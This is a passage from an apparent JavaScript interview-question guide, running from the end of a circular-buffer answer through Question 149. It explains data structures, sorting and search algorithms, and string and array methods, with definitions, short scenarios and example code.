A circular buffer is a fixed-size array that overwrites oldest data when full - like a conveyor belt that loops. When you add to a full buffer, the oldest item is replaced. It's useful for keeping a fixed-size history (last N items). Implementation uses modulo arithmetic to wrap around indices.

#### Real-World Scenario / Case Study
A logging system was storing all logs in memory, causing out-of-memory errors after days of operation. Implementing a circular buffer with 1000 entries kept only the most recent logs. Memory usage stayed constant, and the system could run indefinitely.

#### Example Code
```js
class CircularBuffer {
  constructor(capacity) {
    this.capacity = capacity;
    this.buffer = new Array(capacity);
    this.size = 0;
    this.head = 0;  // Write position
    this.tail = 0;  // Read position
  }
  
  push(item) {
    this.buffer[this.head] = item;
    this.head = (this.head + 1) % this.capacity;
    
    if (this.size < this.capacity) {
      this.size++;
    } else {
      // Buffer full, overwrite oldest
      this.tail = (this.tail + 1) % this.capacity;
    }
  }
  
  pop() {
    if (this.size === 0) return null;
    
    const item = this.buffer[this.tail];
    this.tail = (this.tail + 1) % this.capacity;
    this.size--;
    return item;
  }
  
  toArray() {
    const result = [];
    for (let i = 0; i < this.size; i++) {
      const index = (this.tail + i) % this.capacity;
      result.push(this.buffer[index]);
    }
    return result;
  }
}

// Usage:
const buffer = new CircularBuffer(3);
buffer.push(1);
buffer.push(2);
buffer.push(3);
buffer.push(4);  // Overwrites 1
console.log(buffer.toArray());  // [2, 3, 4]
```

---

### Question 133: What is the difference between `String.prototype.slice()`, `substring()`, and `substr()`?

#### Definition
All extract parts of strings, but work differently. `slice` uses start and end indices, can use negative indices (from end), and doesn't swap arguments. `substring` uses start and end indices, swaps if start > end, and doesn't support negative indices. `substr` is deprecated - uses start and length. `slice` is generally preferred for its flexibility.

#### Real-World Scenario / Case Study
Code was using `substr` which is deprecated and caused confusion with length vs end index. Some code used `substring` which swapped arguments unexpectedly. Standardizing on `slice` made the code clearer and avoided deprecation warnings. The team also benefited from negative index support.

#### Example Code
```js
const str = 'Hello World';

// slice - start and end indices:
str.slice(0, 5);      // 'Hello'
str.slice(6);         // 'World' (to end)
str.slice(-5);        // 'World' (from end)
str.slice(0, -6);     // 'Hello' (negative end)
str.slice(5, 1);      // '' (doesn't swap)

// substring - start and end indices:
str.substring(0, 5);  // 'Hello'
str.substring(6);     // 'World'
str.substring(5, 1);  // 'ello' (swaps to 1, 5)
// No negative indices

// substr - DEPRECATED, start and length:
str.substr(0, 5);     // 'Hello'
str.substr(6);        // 'World'
str.substr(6, 3);     // 'Wor' (length, not end)
// Deprecated - don't use

// Best practice - use slice:
const lastThree = str.slice(-3);  // 'rld'
const firstThree = str.slice(0, 3);  // 'Hel'
```

---

### Question 134: How do you implement a priority queue?

#### Definition
A priority queue is like a regular queue, but items with higher priority are served first - like an emergency room where critical patients go first. Items are inserted with priorities and removed by priority order. Implementation can use a heap (efficient) or sorted array (simpler but slower). Useful for task scheduling, Dijkstra's algorithm, etc.

#### Real-World Scenario / Case Study
A task scheduler was processing tasks in order received, causing important tasks to wait behind less important ones. Implementing a priority queue allowed urgent tasks to jump the queue. Critical operations completed faster, improving system responsiveness.

#### Example Code
```js
// Priority queue using array (simple but O(n) insert):
class PriorityQueue {
  constructor() {
    this.items = [];
  }
  
  enqueue(item, priority) {
    this.items.push({ item, priority });
    this.items.sort((a, b) => b.priority - a.priority);  // Higher priority first
  }
  
  dequeue() {
    return this.items.shift()?.item;
  }
  
  peek() {
    return this.items[0]?.item;
  }
  
  isEmpty() {
    return this.items.length === 0;
  }
}

// More efficient with binary heap (O(log n) insert):
class BinaryHeap {
  constructor() {
    this.heap = [];
  }
  
  enqueue(item, priority) {
    this.heap.push({ item, priority });
    this.bubbleUp(this.heap.length - 1);
  }
  
  dequeue() {
    if (this.heap.length === 0) return null;
    if (this.heap.length === 1) return this.heap.pop().item;
    
    const max = this.heap[0];
    this.heap[0] = this.heap.pop();
    this.bubbleDown(0);
    return max.item;
  }
  
  bubbleUp(index) {
    while (index > 0) {
      const parent = Math.floor((index - 1) / 2);
      if (this.heap[parent].priority >= this.heap[index].priority) break;
      [this.heap[parent], this.heap[index]] = [this.heap[index], this.heap[parent]];
      index = parent;
    }
  }
  
  bubbleDown(index) {
    while (true) {
      let largest = index;
      const left = 2 * index + 1;
      const right = 2 * index + 2;
      
      if (left < this.heap.length && 
          this.heap[left].priority > this.heap[largest].priority) {
        largest = left;
      }
      
      if (right < this.heap.length && 
          this.heap[right].priority > this.heap[largest].priority) {
        largest = right;
      }
      
      if (largest === index) break;
      [this.heap[index], this.heap[largest]] = [this.heap[largest], this.heap[index]];
      index = largest;
    }
  }
}

// Usage:
const pq = new PriorityQueue();
pq.enqueue('Low priority task', 1);
pq.enqueue('High priority task', 10);
pq.enqueue('Medium priority task', 5);

console.log(pq.dequeue());  // 'High priority task' (priority 10)
console.log(pq.dequeue());  // 'Medium priority task' (priority 5)
console.log(pq.dequeue());  // 'Low priority task' (priority 1)
```

---

### Question 135: How do you implement a hash table/Map from scratch?

#### Definition
A hash table stores key-value pairs with fast O(1) average lookup. It uses a hash function to convert keys into array indices. Like a filing cabinet where you calculate which drawer a file goes in based on its name. Collisions (two keys hashing to same index) are handled with chaining (linked list) or open addressing.

#### Real-World Scenario / Case Study
A system needed fast lookups by ID but was using arrays with O(n) linear search. For 100,000 items, lookups took 50ms. Implementing a hash table reduced lookup time to under 1ms. The system became responsive even with large datasets.

#### Example Code
```js
class HashTable {
  constructor(size = 53) {
    this.keyMap = new Array(size);
  }
  
  _hash(key) {
    let total = 0;
    const WEIRD_PRIME = 31;
    for (let i = 0; i < Math.min(key.length, 100); i++) {
      const char = key[i];
      const value = char.charCodeAt(0) - 96;
      total = (total * WEIRD_PRIME + value) % this.keyMap.length;
    }
    return total;
  }
  
  set(key, value) {
    const index = this._hash(key);
    if (!this.keyMap[index]) {
      this.keyMap[index] = [];
    }
    // Check if key exists, update if so
    const pair = this.keyMap[index].find(p => p[0] === key);
    if (pair) {
      pair[1] = value;
    } else {
      this.keyMap[index].push([key, value]);
    }
  }
  
  get(key) {
    const index = this._hash(key);
    if (this.keyMap[index]) {
      const pair = this.keyMap[index].find(p => p[0] === key);
      return pair ? pair[1] : undefined;
    }
    return undefined;
  }
  
  delete(key) {
    const index = this._hash(key);
    if (this.keyMap[index]) {
      const pairIndex = this.keyMap[index].findIndex(p => p[0] === key);
      if (pairIndex !== -1) {
        this.keyMap[index].splice(pairIndex, 1);
        return true;
      }
    }
    return false;
  }
  
  keys() {
    const keysArr = [];
    for (let i = 0; i < this.keyMap.length; i++) {
      if (this.keyMap[i]) {
        for (let pair of this.keyMap[i]) {
          keysArr.push(pair[0]);
        }
      }
    }
    return keysArr;
  }
  
  values() {
    const valuesArr = [];
    for (let i = 0; i < this.keyMap.length; i++) {
      if (this.keyMap[i]) {
        for (let pair of this.keyMap[i]) {
          if (!valuesArr.includes(pair[1])) {
            valuesArr.push(pair[1]);
          }
        }
      }
    }
    return valuesArr;
  }
}

// Usage:
const ht = new HashTable();
ht.set('name', 'John');
ht.set('age', 30);
console.log(ht.get('name'));  // 'John'
```

---

### Question 136: What is the difference between `Object.getOwnPropertyNames()` and `Object.keys()`?

#### Definition
Both get property names, but `getOwnPropertyNames` includes non-enumerable properties (like array length) while `keys` only returns enumerable properties. `getOwnPropertyNames` is more comprehensive - it's like getting all keys including hidden ones. `keys` is like getting only visible keys. Use `keys` for normal iteration, `getOwnPropertyNames` when you need everything.

#### Real-World Scenario / Case Study
Code was using `Object.keys()` to iterate objects, but missed some properties that were non-enumerable. This caused bugs where expected properties weren't found. Using `Object.getOwnPropertyNames()` revealed all properties, helping debug the issue. The team learned when to use each method.

#### Example Code
```js
const obj = {};
Object.defineProperty(obj, 'hidden', {
  value: 'secret',
  enumerable: false  // Non-enumerable
});
obj.visible = 'public';

// Object.keys() - only enumerable:
console.log(Object.keys(obj));  // ['visible']

// Object.getOwnPropertyNames() - all own properties:
console.log(Object.getOwnPropertyNames(obj));  // ['hidden', 'visible']

// Array example:
const arr = [1, 2, 3];
console.log(Object.keys(arr));  // ['0', '1', '2']
console.log(Object.getOwnPropertyNames(arr));  // ['0', '1', '2', 'length']

// When to use which:
// Object.keys - for normal iteration:
Object.keys(obj).forEach(key => {
  console.log(key, obj[key]);
});

// Object.getOwnPropertyNames - when you need everything:
const allProps = Object.getOwnPropertyNames(obj);
// Includes non-enumerable properties
```

---

### Question 137: How do you implement a linked list?

#### Definition
A linked list is a data structure where each element (node) points to the next one, like a chain. Unlike arrays, elements aren't stored contiguously in memory. Each node has data and a reference to the next node. Useful when you need frequent insertions/deletions. Types: singly linked (one direction), doubly linked (both directions), circular (last points to first).

#### Real-World Scenario / Case Study
A system needed frequent insertions/deletions in the middle of a list. Using arrays required shifting elements (O(n)), which was slow. Implementing a linked list made insertions/deletions O(1) after finding the position. Performance improved significantly for operations on large lists.

#### Example Code
```js
// Singly linked list:
class Node {
  constructor(value) {
    this.value = value;
    this.next = null;
  }
}

class LinkedList {
  constructor() {
    this.head = null;
    this.length = 0;
  }
  
  append(value) {
    const newNode = new Node(value);
    if (!this.head) {
      this.head = newNode;
    } else {
      let current = this.head;
      while (current.next) {
        current = current.next;
      }
      current.next = newNode;
    }
    this.length++;
  }
  
  prepend(value) {
    const newNode = new Node(value);
    newNode.next = this.head;
    this.head = newNode;
    this.length++;
  }
  
  insertAt(index, value) {
    if (index === 0) {
      this.prepend(value);
      return;
    }
    
    const newNode = new Node(value);
    let current = this.head;
    for (let i = 0; i < index - 1; i++) {
      current = current.next;
    }
    newNode.next = current.next;
    current.next = newNode;
    this.length++;
  }
  
  removeAt(index) {
    if (index === 0) {
      this.head = this.head.next;
      this.length--;
      return;
    }
    
    let current = this.head;
    for (let i = 0; i < index - 1; i++) {
      current = current.next;
    }
    current.next = current.next.next;
    this.length--;
  }
  
  find(value) {
    let current = this.head;
    let index = 0;
    while (current) {
      if (current.value === value) return index;
      current = current.next;
      index++;
    }
    return -1;
  }
  
  toArray() {
    const arr = [];
    let current = this.head;
    while (current) {
      arr.push(current.value);
      current = current.next;
    }
    return arr;
  }
}

// Usage:
const list = new LinkedList();
list.append(1);
list.append(2);
list.prepend(0);
list.insertAt(2, 1.5);
console.log(list.toArray());  // [0, 1, 1.5, 2]
```

---

### Question 138: How do you implement a binary search tree?

#### Definition
A binary search tree (BST) is a tree where each node has at most two children, and values are ordered: left child < parent < right child. Like a family tree but organized by value. Searching is efficient (O(log n) average) because you can eliminate half the tree at each step. Useful for maintaining sorted data with fast lookups.

#### Real-World Scenario / Case Study
A system needed to maintain sorted data with frequent lookups. Using sorted arrays required O(n) for insertions. Implementing a BST provided O(log n) for both insertions and lookups. The system handled 100,000+ items efficiently, with lookups taking under 1ms.

#### Example Code
```js
class Node {
  constructor(value) {
    this.value = value;
    this.left = null;
    this.right = null;
  }
}

class BinarySearchTree {
  constructor() {
    this.root = null;
  }
  
  insert(value) {
    const newNode = new Node(value);
    if (!this.root) {
      this.root = newNode;
      return this;
    }
    
    let current = this.root;
    while (true) {
      if (value === current.value) return undefined;  // Duplicate
      if (value < current.value) {
        if (!current.left) {
          current.left = newNode;
          return this;
        }
        current = current.left;
      } else {
        if (!current.right) {
          current.right = newNode;
          return this;
        }
        current = current.right;
      }
    }
  }
  
  find(value) {
    if (!this.root) return false;
    
    let current = this.root;
    while (current) {
      if (value === current.value) return true;
      if (value < current.value) {
        current = current.left;
      } else {
        current = current.right;
      }
    }
    return false;
  }
  
  // In-order traversal (left, root, right) - gives sorted order:
  inOrder(node = this.root, result = []) {
    if (node) {
      this.inOrder(node.left, result);
      result.push(node.value);
      this.inOrder(node.right, result);
    }
    return result;
  }
  
  // Pre-order (root, left, right):
  preOrder(node = this.root, result = []) {
    if (node) {
      result.push(node.value);
      this.preOrder(node.left, result);
      this.preOrder(node.right, result);
    }
    return result;
  }
  
  // Post-order (left, right, root):
  postOrder(node = this.root, result = []) {
    if (node) {
      this.postOrder(node.left, result);
      this.postOrder(node.right, result);
      result.push(node.value);
    }
    return result;
  }
}

// Usage:
const bst = new BinarySearchTree();
bst.insert(10);
bst.insert(5);
bst.insert(15);
bst.insert(7);
console.log(bst.find(7));  // true
console.log(bst.inOrder());  // [5, 7, 10, 15] - sorted
```

---

### Question 139: What is the difference between `Array.prototype.includes()` and `Array.prototype.indexOf()`?

#### Definition
Both check if an array contains a value, but `includes` returns a boolean (true/false) while `indexOf` returns the index (-1 if not found). `includes` is simpler when you just need to know if something exists. `indexOf` is useful when you need the position. `includes` also handles NaN correctly (indexOf doesn't).

#### Real-World Scenario / Case Study
Code was using `indexOf() !== -1` to check existence, which was verbose. Switching to `includes()` made the code cleaner. More importantly, `includes()` correctly handles NaN values, fixing a bug where NaN checks were failing with `indexOf`.

#### Example Code
```js
const arr = [1, 2, 3, NaN, 5];

// includes - returns boolean:
arr.includes(3);   // true
arr.includes(10);  // false
arr.includes(NaN); // true (correctly handles NaN)

// indexOf - returns index or -1:
arr.indexOf(3);    // 2
arr.indexOf(10);   // -1
arr.indexOf(NaN);  // -1 (can't find NaN!)

// Common patterns:
// Check existence:
if (arr.includes(value)) { }  // Clean
if (arr.indexOf(value) !== -1) { }  // Verbose

// Get index:
const index = arr.indexOf(value);
if (index !== -1) {
  // Use index
}

// includes with fromIndex:
arr.includes(2, 2);  // Search from index 2
arr.indexOf(2, 2);   // Search from index 2
```

---

### Question 140: How do you implement a Trie (prefix tree)?

#### Definition
A Trie stores strings in a tree structure where each node represents a character. Words sharing prefixes share nodes. Like a dictionary organized by first letter, then second, etc. Very efficient for prefix searches, autocomplete, and spell checking. Each path from root to leaf represents a word.

#### Real-World Scenario / Case Study
An autocomplete feature was searching through 100,000 words on every keystroke, taking 500ms. Implementing a Trie allowed finding all words with a given prefix in under 10ms. Users got instant autocomplete suggestions, dramatically improving UX.

#### Example Code
```js
class TrieNode {
  constructor() {
    this.children = {};
    this.isEndOfWord = false;
  }
}

class Trie {
  constructor() {
    this.root = new TrieNode();
  }
  
  insert(word) {
    let current = this.root;
    for (let char of word) {
      if (!current.children[char]) {
        current.children[char] = new TrieNode();
      }
      current = current.children[char];
    }
    current.isEndOfWord = true;
  }
  
  search(word) {
    let current = this.root;
    for (let char of word) {
      if (!current.children[char]) {
        return false;
      }
      current = current.children[char];
    }
    return current.isEndOfWord;
  }
  
  startsWith(prefix) {
    let current = this.root;
    for (let char of prefix) {
      if (!current.children[char]) {
        return false;
      }
      current = current.children[char];
    }
    return true;
  }
  
  getAllWordsWithPrefix(prefix) {
    let current = this.root;
    for (let char of prefix) {
      if (!current.children[char]) {
        return [];
      }
      current = current.children[char];
    }
    
    const words = [];
    this._collectWords(current, prefix, words);
    return words;
  }
  
  _collectWords(node, prefix, words) {
    if (node.isEndOfWord) {
      words.push(prefix);
    }
    for (let char in node.children) {
      this._collectWords(node.children[char], prefix + char, words);
    }
  }
}

// Usage:
const trie = new Trie();
trie.insert('apple');
trie.insert('app');
trie.insert('application');
trie.insert('banana');

console.log(trie.search('app'));  // true
console.log(trie.startsWith('app'));  // true
console.log(trie.getAllWordsWithPrefix('app'));  // ['app', 'apple', 'application']
```

---

### Question 141: How do you implement a graph data structure?

#### Definition
A graph is a collection of nodes (vertices) connected by edges. Like a social network where people are nodes and friendships are edges. Can be directed (one-way connections) or undirected (two-way). Represented as adjacency list (each node has list of neighbors) or adjacency matrix (2D array). Useful for modeling relationships, networks, paths.

#### Real-World Scenario / Case Study
A recommendation system needed to find connections between users. Using a graph to model user relationships allowed finding mutual friends, shortest paths, and recommendations efficiently. Graph algorithms (BFS, DFS) enabled features like "people you may know" and "degrees of separation".

#### Example Code
```js
// Graph using adjacency list:
class Graph {
  constructor() {
    this.adjacencyList = {};
  }
  
  addVertex(vertex) {
    if (!this.adjacencyList[vertex]) {
      this.adjacencyList[vertex] = [];
    }
  }
  
  addEdge(v1, v2) {
    this.adjacencyList[v1].push(v2);
    this.adjacencyList[v2].push(v1);  // Undirected
  }
  
  removeEdge(v1, v2) {
    this.adjacencyList[v1] = this.adjacencyList[v1].filter(v => v !== v2);
    this.adjacencyList[v2] = this.adjacencyList[v2].filter(v => v !== v1);
  }
  
  // Depth-First Search (recursive):
  DFS(start) {
    const result = [];
    const visited = {};
    const adjacencyList = this.adjacencyList;
    
    (function dfs(vertex) {
      if (!vertex) return null;
      visited[vertex] = true;
      result.push(vertex);
      adjacencyList[vertex].forEach(neighbor => {
        if (!visited[neighbor]) {
          return dfs(neighbor);
        }
      });
    })(start);
    
    return result;
  }
  
  // Breadth-First Search:
  BFS(start) {
    const queue = [start];
    const result = [];
    const visited = {};
    visited[start] = true;
    
    while (queue.length) {
      const vertex = queue.shift();
      result.push(vertex);
      
      this.adjacencyList[vertex].forEach(neighbor => {
        if (!visited[neighbor]) {
          visited[neighbor] = true;
          queue.push(neighbor);
        }
      });
    }
    return result;
  }
}

// Usage:
const g = new Graph();
g.addVertex('A');
g.addVertex('B');
g.addVertex('C');
g.addEdge('A', 'B');
g.addEdge('B', 'C');
console.log(g.DFS('A'));  // ['A', 'B', 'C']
console.log(g.BFS('A'));  // ['A', 'B', 'C']
```

---

### Question 142: What is the difference between `Array.prototype.flat()` and `Array.prototype.flatMap()`?

#### Definition
`flat` flattens nested arrays - like unpacking boxes within boxes. `flatMap` does `map` then `flat(1)` in one step - like transforming items and flattening the result. `flatMap` is more efficient than doing `map().flat()` separately. Use `flat` when you just need to flatten, `flatMap` when you need to transform and flatten.

#### Real-World Scenario / Case Study
Code was doing `array.map().flat()` to transform and flatten, which created an intermediate array. Using `flatMap()` eliminated the intermediate step, improving performance and memory usage. The code also became more concise and readable.

#### Example Code
```js
const nested = [[1, 2], [3, 4], [5, 6]];

// flat - just flattens:
const flat = nested.flat();
console.log(flat);  // [1, 2, 3, 4, 5, 6]

// flatMap - map then flatten:
const doubled = nested.flatMap(arr => arr.map(n => n * 2));
console.log(doubled);  // [2, 4, 6, 8, 10, 12]

// Equivalent to:
const doubled2 = nested.map(arr => arr.map(n => n * 2)).flat();
// But flatMap is more efficient

// Common use case - splitting strings:
const sentences = ['Hello world', 'How are you'];
const words = sentences.flatMap(sentence => sentence.split(' '));
console.log(words);  // ['Hello', 'world', 'How', 'are', 'you']

// vs map + flat:
const words2 = sentences.map(s => s.split(' ')).flat();
// Creates intermediate array

// flatMap only flattens one level:
const deeplyNested = [[[1, 2]]];
deeplyNested.flatMap(x => x);  // [[1, 2]] (one level)
deeplyNested.flat(2);          // [1, 2] (two levels)
```

---

### Question 143: How do you implement a merge sort algorithm?

#### Definition
Merge sort divides the array in half repeatedly until you have single elements, then merges them back in sorted order. Like sorting cards by splitting the deck, sorting each half, then merging them together. It's a divide-and-conquer algorithm with O(n log n) time complexity. Stable (preserves order of equal elements) and works well for large datasets.

#### Real-World Scenario / Case Study
A system needed to sort 1 million records. Using JavaScript's default sort (often quicksort) was inconsistent and sometimes slow. Implementing merge sort provided consistent O(n log n) performance. The stable nature also preserved important ordering of equal elements.

#### Example Code
```js
function mergeSort(arr) {
  if (arr.length <= 1) return arr;
  
  const mid = Math.floor(arr.length / 2);
  const left = mergeSort(arr.slice(0, mid));
  const right = mergeSort(arr.slice(mid));
  
  return merge(left, right);
}

function merge(left, right) {
  const result = [];
  let i = 0, j = 0;
  
  while (i < left.length && j < right.length) {
    if (left[i] <= right[j]) {
      result.push(left[i]);
      i++;
    } else {
      result.push(right[j]);
      j++;
    }
  }
  
  // Add remaining elements:
  while (i < left.length) {
    result.push(left[i]);
    i++;
  }
  
  while (j < right.length) {
    result.push(right[j]);
    j++;
  }
  
  return result;
}

// Usage:
const arr = [64, 34, 25, 12, 22, 11, 90];
console.log(mergeSort(arr));  // [11, 12, 22, 25, 34, 64, 90]

// In-place version (more memory efficient):
function mergeSortInPlace(arr, start = 0, end = arr.length - 1) {
  if (start >= end) return;
  
  const mid = Math.floor((start + end) / 2);
  mergeSortInPlace(arr, start, mid);
  mergeSortInPlace(arr, mid + 1, end);
  mergeInPlace(arr, start, mid, end);
}

function mergeInPlace(arr, start, mid, end) {
  const left = arr.slice(start, mid + 1);
  const right = arr.slice(mid + 1, end + 1);
  
  let i = 0, j = 0, k = start;
  
  while (i < left.length && j < right.length) {
    if (left[i] <= right[j]) {
      arr[k++] = left[i++];
    } else {
      arr[k++] = right[j++];
    }
  }
  
  while (i < left.length) arr[k++] = left[i++];
  while (j < right.length) arr[k++] = right[j++];
}
```

---

### Question 144: How do you implement a quick sort algorithm?

#### Definition
Quick sort picks a pivot element, partitions the array into elements smaller and larger than the pivot, then recursively sorts the partitions. Like organizing books by picking one as reference and putting smaller books left, larger right, then sorting each side. Average O(n log n), worst O(n²) if pivot is always smallest/largest. Fast in practice.

#### Real-World Scenario / Case Study
A real-time system needed fast sorting for frequently updated data. Quick sort's average performance and in-place sorting (low memory) made it ideal. The system could sort 100,000 items in under 100ms, keeping the UI responsive.

#### Example Code
```js
function quickSort(arr) {
  if (arr.length <= 1) return arr;
  
  const pivot = arr[Math.floor(arr.length / 2)];
  const left = arr.filter(x => x < pivot);
  const middle = arr.filter(x => x === pivot);
  const right = arr.filter(x => x > pivot);
  
  return [...quickSort(left), ...middle, ...quickSort(right)];
}

// In-place version (more efficient):
function quickSortInPlace(arr, low = 0, high = arr.length - 1) {
  if (low < high) {
    const pivotIndex = partition(arr, low, high);
    quickSortInPlace(arr, low, pivotIndex - 1);
    quickSortInPlace(arr, pivotIndex + 1, high);
  }
  return arr;
}

function partition(arr, low, high) {
  const pivot = arr[high];
  let i = low - 1;
  
  for (let j = low; j < high; j++) {
    if (arr[j] < pivot) {
      i++;
      [arr[i], arr[j]] = [arr[j], arr[i]];
    }
  }
  
  [arr[i + 1], arr[high]] = [arr[high], arr[i + 1]];
  return i + 1;
}

// Usage:
const arr = [64, 34, 25, 12, 22, 11, 90];
quickSortInPlace(arr);
console.log(arr);  // [11, 12, 22, 25, 34, 64, 90]

// With custom comparator:
function quickSortWithComparator(arr, compare = (a, b) => a - b) {
  if (arr.length <= 1) return arr;
  
  const pivot = arr[Math.floor(arr.length / 2)];
  const left = arr.filter(x => compare(x, pivot) < 0);
  const middle = arr.filter(x => compare(x, pivot) === 0);
  const right = arr.filter(x => compare(x, pivot) > 0);
  
  return [
    ...quickSortWithComparator(left, compare),
    ...middle,
    ...quickSortWithComparator(right, compare)
  ];
}
```

---

### Question 145: What is the difference between `String.prototype.match()` and `String.prototype.matchAll()`?

#### Definition
`match` finds the first match (or all matches with global flag) and returns an array or null. `matchAll` finds all matches including capture groups and returns an iterator. `matchAll` is more powerful for extracting all matches with their groups. Use `match` for simple matches, `matchAll` when you need all matches with capture groups.

#### Real-World Scenario / Case Study
Code was using `match` with a loop to find all matches with capture groups, which was complex and error-prone. Switching to `matchAll` simplified the code and correctly extracted all matches with their groups. Parsing complex text became much easier.

#### Example Code
```js
const text = 'Hello 123 and 456 and 789';

// match - first match or all (with global flag):
const match1 = text.match(/\d+/);
console.log(match1);  // ['123'] (first match)

const match2 = text.match(/\d+/g);
console.log(match2);  // ['123', '456', '789'] (all matches, no groups)

// matchAll - all matches with groups (returns iterator):
const matchAll = text.matchAll(/\d+/g);
console.log([...matchAll]);
// [
//   ['123', index: 6, input: 'Hello 123 and 456 and 789'],
//   ['456', index: 14, ...],
//   ['789', index: 22, ...]
// ]

// With capture groups:
const text2 = 'John: 30, Jane: 25, Bob: 35';
const regex = /(\w+): (\d+)/g;

// match - loses groups with global flag:
const match3 = text2.match(regex);
console.log(match3);  // ['John: 30', 'Jane: 25', 'Bob: 35'] (no groups)

// matchAll - preserves groups:
const matchAll2 = text2.matchAll(regex);
for (const match of matchAll2) {
  console.log(match[1], match[2]);  // Name and age
}
// John 30
// Jane 25
// Bob 35

// matchAll requires global flag:
text.matchAll(/\d+/);  // Error: must have global flag
text.matchAll(/\d+/g); // OK
```

---

### Question 146: How do you implement a breadth-first search (BFS) algorithm?

#### Definition
BFS explores a graph level by level - like ripples in water. It visits all neighbors of the current node before moving to the next level. Uses a queue to track nodes to visit. Guarantees finding the shortest path in unweighted graphs. Useful for finding shortest paths, level-order traversal, or exploring all nodes at a certain distance.

#### Real-World Scenario / Case Study
A social network feature needed to find the shortest connection path between two users (degrees of separation). BFS guaranteed finding the shortest path. The feature could find connections up to 6 degrees away efficiently, enabling "how you're connected" features.

#### Example Code
```js
// BFS for graph:
function BFS(graph, start) {
  const queue = [start];
  const visited = new Set([start]);
  const result = [];
  
  while (queue.length > 0) {
    const node = queue.shift();
    result.push(node);
    
    for (const neighbor of graph[node] || []) {
      if (!visited.has(neighbor)) {
        visited.add(neighbor);
        queue.push(neighbor);
      }
    }
  }
  
  return result;
}

// BFS with path tracking:
function BFSWithPath(graph, start, target) {
  const queue = [[start, [start]]];
  const visited = new Set([start]);
  
  while (queue.length > 0) {
    const [node, path] = queue.shift();
    
    if (node === target) {
      return path;  // Shortest path found
    }
    
    for (const neighbor of graph[node] || []) {
      if (!visited.has(neighbor)) {
        visited.add(neighbor);
        queue.push([neighbor, [...path, neighbor]]);
      }
    }
  }
  
  return null;  // No path found
}

// BFS for tree (level-order traversal):
function levelOrder(root) {
  if (!root) return [];
  
  const result = [];
  const queue = [root];
  
  while (queue.length > 0) {
    const levelSize = queue.length;
    const level = [];
    
    for (let i = 0; i < levelSize; i++) {
      const node = queue.shift();
      level.push(node.val);
      
      if (node.left) queue.push(node.left);
      if (node.right) queue.push(node.right);
    }
    
    result.push(level);
  }
  
  return result;
}

// Usage:
const graph = {
  A: ['B', 'C'],
  B: ['A', 'D', 'E'],
  C: ['A', 'F'],
  D: ['B'],
  E: ['B', 'F'],
  F: ['C', 'E']
};

console.log(BFS(graph, 'A'));  // ['A', 'B', 'C', 'D', 'E', 'F']
console.log(BFSWithPath(graph, 'A', 'F'));  // ['A', 'C', 'F'] (shortest path)
```

---

### Question 147: How do you implement a depth-first search (DFS) algorithm?

#### Definition
DFS explores as far as possible along each branch before backtracking - like exploring a maze by going as deep as you can, then backing up. Can be implemented recursively (simpler) or iteratively with a stack. Useful for finding paths, detecting cycles, topological sorting. Three variants: pre-order (process before children), in-order (between children), post-order (after children).

#### Real-World Scenario / Case Study
A dependency resolver needed to find all dependencies of a package. DFS allowed traversing the dependency tree completely before backtracking. The system could resolve complex dependency graphs and detect circular dependencies efficiently.

#### Example Code
```js
// DFS recursive (simpler):
function DFS(graph, start, visited = new Set(), result = []) {
  visited.add(start);
  result.push(start);
  
  for (const neighbor of graph[start] || []) {
    if (!visited.has(neighbor)) {
      DFS(graph, neighbor, visited, result);
    }
  }
  
  return result;
}

// DFS iterative (using stack):
function DFSIterative(graph, start) {
  const stack = [start];
  const visited = new Set();
  const result = [];
  
  while (stack.length > 0) {
    const node = stack.pop();
    
    if (!visited.has(node)) {
      visited.add(node);
      result.push(node);
      
      // Add neighbors in reverse to maintain order
      for (let i = (graph[node] || []).length - 1; i >= 0; i--) {
        stack.push(graph[node][i]);
      }
    }
  }
  
  return result;
}

// DFS with path finding:
function DFSWithPath(graph, start, target, path = [start], visited = new Set([start])) {
  if (start === target) {
    return path;
  }
  
  for (const neighbor of graph[start] || []) {
    if (!visited.has(neighbor)) {
      visited.add(neighbor);
      const result = DFSWithPath(graph, neighbor, target, [...path, neighbor], visited);
      if (result) return result;
    }
  }
  
  return null;
}

// DFS for tree (three orders):
function preOrder(node, result = []) {
  if (node) {
    result.push(node.val);  // Process before children
    preOrder(node.left, result);
    preOrder(node.right, result);
  }
  return result;
}

function inOrder(node, result = []) {
  if (node) {
    inOrder(node.left, result);
    result.push(node.val);  // Process between children
    inOrder(node.right, result);
  }
  return result;
}

function postOrder(node, result = []) {
  if (node) {
    postOrder(node.left, result);
    postOrder(node.right, result);
    result.push(node.val);  // Process after children
  }
  return result;
}

// Usage:
const graph = {
  A: ['B', 'C'],
  B: ['D', 'E'],
  C: ['F'],
  D: [],
  E: [],
  F: []
};

console.log(DFS(graph, 'A'));  // ['A', 'B', 'D', 'E', 'C', 'F']
```

---

### Question 148: What is the difference between `Array.prototype.splice()` and `Array.prototype.slice()`?

#### Definition
`splice` modifies the original array - removes/adds elements in place. `slice` creates a new array - extracts elements without modifying original. `splice` is destructive (changes the array), `slice` is non-destructive (returns a copy). Use `splice` when you want to modify, `slice` when you want to extract without changing.

#### Real-World Scenario / Case Study
Code was using `splice` to extract array portions, accidentally modifying the original array and causing bugs. Switching to `slice` preserved the original array. The team learned to use `slice` for extraction and `splice` only when modification was intended.

#### Example Code
```js
const arr = [1, 2, 3, 4, 5];

// slice - creates new array (non-destructive):
const sliced = arr.slice(1, 3);
console.log(sliced);  // [2, 3]
console.log(arr);     // [1, 2, 3, 4, 5] - unchanged

// splice - modifies original array (destructive):
const spliced = arr.splice(1, 2);
console.log(spliced);  // [2, 3]
console.log(arr);      // [1, 4, 5] - modified!

// splice can also add elements:
const arr2 = [1, 2, 3];
arr2.splice(1, 1, 'a', 'b');  // Remove 1 element at index 1, add 'a', 'b'
console.log(arr2);  // [1, 'a', 'b', 3]

// Common mistakes:
const original = [1, 2, 3, 4, 5];
const extracted = original.splice(1, 2);  // WRONG - modifies original!
// original is now [1, 4, 5]

// Correct:
const original2 = [1, 2, 3, 4, 5];
const extracted2 = original2.slice(1, 3);  // Correct - original unchanged
// original2 is still [1, 2, 3, 4, 5]

// Negative indices:
const arr3 = [1, 2, 3, 4, 5];
arr3.slice(-3);      // [3, 4, 5] (last 3)
arr3.splice(-2, 1);   // Removes 1 element from index -2 (removes 4)
```

---

### Question 149: How do you implement a heap data structure?

#### Definition
A heap is a complete binary tree where parent nodes are either greater (max heap) or smaller (min heap) than children. Like a pyramid where the top is always the largest/smallest. Used for priority queues, heap sort, finding min/max efficiently. Usually implemented as an array where parent at index i has children at 2i+1 and 2i+2.

#### Real-World Scenario / Case Study
